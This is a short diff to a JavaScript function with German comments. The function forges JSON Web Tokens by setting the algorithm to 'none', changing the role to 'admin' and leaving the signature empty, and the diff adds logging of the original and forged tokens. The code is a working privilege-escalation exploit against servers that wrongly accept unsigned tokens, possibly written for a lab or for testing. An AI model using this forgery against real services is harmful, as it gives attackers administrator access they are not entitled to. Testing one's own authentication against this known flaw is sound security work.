@@ -23,18 +23,20 @@ function manipulateToken(token) {
   console.log('\n[ORIGINAL TOKEN]')
   console.log('Header:', header)
   console.log('Payload:', payload)
+  console.log('JWT:', token)
   
   // Manipulation
   header.alg = 'none'
   payload.role = 'admin'
+
+  const newHeader = Buffer.from(JSON.stringify(header)).toString('base64url')
+  const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64url')
   
   console.log('\n[MANIPULATED TOKEN]')
   console.log('Header:', header)
   console.log('Payload:', payload)
-  
+  console.log('JWT:', `${newHeader}.${newPayload}.`)
   // Neuen Token zusammenbauen - Signature leer
-  const newHeader = Buffer.from(JSON.stringify(header)).toString('base64url')
-  const newPayload = Buffer.from(JSON.stringify(payload)).toString('base64url')
   
   return `${newHeader}.${newPayload}.`  // leere Signature
 }
